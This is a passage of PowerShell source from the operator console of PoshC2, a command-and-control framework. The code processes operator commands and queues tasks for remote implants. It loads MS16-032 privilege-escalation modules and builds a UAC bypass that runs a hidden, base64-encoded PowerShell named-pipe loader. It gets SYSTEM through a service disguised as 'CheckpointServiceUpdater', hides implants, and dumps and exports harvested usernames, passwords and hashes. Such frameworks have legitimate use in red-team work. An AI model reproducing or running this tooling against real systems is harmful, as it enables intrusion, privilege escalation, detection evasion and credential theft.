            if (($pscommand.ToLower().StartsWith('turtle')) -or ($pscommand.ToLower().StartsWith('start-sleep'))) 
            {
                $pscommand = $pscommand -replace 'start-sleep ', ''
                $pscommand = $pscommand -replace 'turtle ', ''
                $sleeptime = $pscommand
                if ($sleeptime.ToLower().Contains('m')) { 
                    $sleeptime = $sleeptime -replace 'm', ''
                    [int]$newsleep = $sleeptime 
                    [int]$newsleep = $newsleep * 60
                }
                elseif ($sleeptime.ToLower().Contains('h')) { 
                    $sleeptime = $sleeptime -replace 'h', ''
                    [int]$newsleep1 = $sleeptime 
                    [int]$newsleep2 = $newsleep1 * 60
                    [int]$newsleep = $newsleep2 * 60
                }
                elseif ($sleeptime.ToLower().Contains('s')) { 
                    $newsleep = $sleeptime -replace 's', ''
                } else {
                    $newsleep = $sleeptime
                }
                $pscommand = 'Start-Sleep '+$newsleep
            }
            if ($pscommand.tolower().startswith('add-creds')){
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand.tolower().startswith('del-creds')){
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand.tolower().startswith('search-creds')){
                $pscommand|Invoke-Expression
                $pscommand = $null
            }
            if ($pscommand -eq 'dump-creds'){
                $dbResult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Creds" -As PSObject
                Write-Output -InputObject $dbResult | ft -AutoSize | out-host
                $pscommand = $null
            }
            if ($pscommand -eq 'invoke-ms16-032')
            { 
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $pscommand = "LoadModule invoke-ms16-032.ps1"
            }
            if ($pscommand -eq 'invoke-ms16-032-proxypayload')
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $pscommand = "LoadModule invoke-ms16-032-proxy.ps1"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand -eq 'invoke-uacbypassproxy')
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    CheckModuleLoaded "ProxyPayload.ps1" $psrandomuri
                    CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                    CheckModuleLoaded "Invoke-EventVwrBypass.ps1" $psrandomuri
                    $pspayloadnamedpipe = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
                    $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
                    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
                    $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`"" 
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }            
            }
            if ($pscommand -eq 'invoke-uacbypass')
            { 
                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"  
                CheckModuleLoaded "Invoke-EventVwrBypass.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $pspayloadnamedpipe = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
                $bytes = [System.Text.Encoding]::Unicode.GetBytes($pspayloadnamedpipe)
                $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
                $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`""               
            } 
 
            if ($pscommand -eq 'Get-System') 
            {
                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"

                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                } | Out-Null

                $query = "INSERT INTO NewTasks (RandomURI, Command)
                VALUES (@RandomURI, @Command)"

                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                    RandomURI = $psrandomuri
                    Command   = "sc.exe start CPUpdater"
                } | Out-Null
                $pscommand = "sc.exe delete CPUpdater"

            }
            if ($pscommand -eq 'Get-System-WithProxy') 
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){
                    $payload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"

                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $psrandomuri
                        Command   = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                    } | Out-Null

                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $psrandomuri
                        Command   = "sc.exe start CPUpdater"
                    } | Out-Null
                    $pscommand = "sc.exe delete CPUpdater"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }                   
            if ($pscommand -eq 'Hide-Implant') 
            {
                $pscommand = "Hide"
            }
            if ($pscommand -eq 'Unhide-Implant' ) {
               Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='Yes' WHERE RandomURI='$psrandomuri'" | Out-Null
            }
            if ($pscommand -eq 'output-to-html' ) {
                $allcreds = Invoke-SqliteQuery -Datasource $Database -Query "SELECT * FROM Creds" -As PSObject
                $CredsArray = @()
                foreach ($cred in $allcreds) {
                    $CredLog = New-object PSObject | Select  CredsID, Username, Password, Hash
                    $CredLog.CredsID = $cred.CredsID;
                    $Credlog.Username = $cred.Username;
                    $CredLog.Password = $cred.Password;
                    $CredLog.Hash = $cred.Hash;
                    $CredsArray += $CredLog
                }
                $CredsArray | ConvertTo-Html -title "<title>Credential List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Creds.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants" -As PSObject
               $ImplantsArray = @()
               foreach ($implantres in $allresults) {                  
                    $ImplantLog = New-Object PSObject | Select ImplantID, RandomURI, User, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep
                    $ImplantLog.ImplantID = $implantres.ImplantID;
                    $ImplantLog.RandomURI = $implantres.RandomURI;
                    $ImplantLog.User = $implantres.User;
                    $ImplantLog.Hostname = $implantres.Hostname;
                    $ImplantLog.IPAddress = $implantres.IPAddress;
                    $ImplantLog.FirstSeen = $implantres.FirstSeen;
                    $ImplantLog.LastSeen = $implantres.LastSeen;
                    $ImplantLog.PID = $implantres.PID;
                    $ImplantLog.Arch = $implantres.Arch;
                    $ImplantLog.Domain = $implantres.Domain;
                    $ImplantLog.Sleep = $implantres.Sleep;
                    $ImplantsArray += $ImplantLog
               }

               $ImplantsArray | ConvertTo-Html -title "<title>Implant List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Implants.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks" -As PSObject
               $TasksArray = @()
               foreach ($task in $allresults) {                  
                    $ImplantTask = New-Object PSObject | Select TaskID, Timestamp, RandomURI, Command, Output
                    $ImplantTask.TaskID = $task.CompletedTaskID;
                    $ImplantTask.Timestamp = $task.TaskID;
                    $ImplantTask.RandomURI = $task.RandomURI;
                    $ImplantTask.Command = $task.Command;
                    $ImplantTask.Output = $task.Output;
                    $TasksArray += $ImplantTask
               }
               $TasksArray | ConvertTo-Html -title "<title>Tasks from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\ImplantTasks.html"
               $pscommand = $null
            }
            $pscommand
}
# command process loop
while($true)
{
    $global:command = Read-Host -Prompt $global:cmdlineinput

    if ($global:command)
    {
        $query = "INSERT INTO History (Command)
        VALUES (@Command)"

        Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
        Command = $global:command
        } | Out-Null
                              
        if ($global:implantid -eq "ALL")
        {
            if ($global:command -eq 'back' -or $global:command -eq 'exit') 
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            else 
            {
                $dbresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE Alive='Yes'" -As SingleValue
                foreach ($implanturisingular in $dbresults)
                {
                    $global:randomuri = $implanturisingular
                    $outputcmd = runcommand $global:command $global:randomuri 
                    if (($outputcmd -eq 'exit' ) -or ($outputcmd -eq 'hide' )) 
                    {
                        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$implanturisingular'"|Out-Null
                    }
                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $implanturisingular
                        Command   = $outputcmd
                    } | Out-Null
                }
            }
        }
        elseif ($global:implantid.contains(",")){
            if ($global:command -eq 'back' -or $global:command -eq 'exit')
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            else 
            {
                $global:implantid.split(",")| foreach {
                    $global:randomuri = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE ImplantID='$_'" -as SingleValue
                    $outputcmd = runcommand $global:command $global:randomuri
                    if (($global:command -eq 'exit' ) -or ($outputcmd -eq 'hide' )) 
                    {
                        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$global:randomuri'"|Out-Null
                    }
                    $query = "INSERT INTO NewTasks (RandomURI, Command)
                    VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $global:randomuri
                        Command   = $outputcmd
                    } | Out-Null
                }
            }            
        }
        else 
        {
            if ($global:command -eq 'back' -or $global:command -eq 'exit') 
            {
                startup
            }
            elseif ($global:command -eq 'help') 
            {
                print-help
            } 
            else 
            {
                #write-host $global:command $global:randomuri
                $outputcmd = runcommand $global:command $global:randomuri
                if ($outputcmd -eq 'hide') 
                {
                    Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$global:randomuri'"|Out-Null
                    $outputcmd = $null
                }  
                if ($outputcmd) {
                    $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"

                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                        RandomURI = $global:randomuri
                        Command   = $outputcmd
                    } | Out-Null
                }
            }
        }
    }
}
}


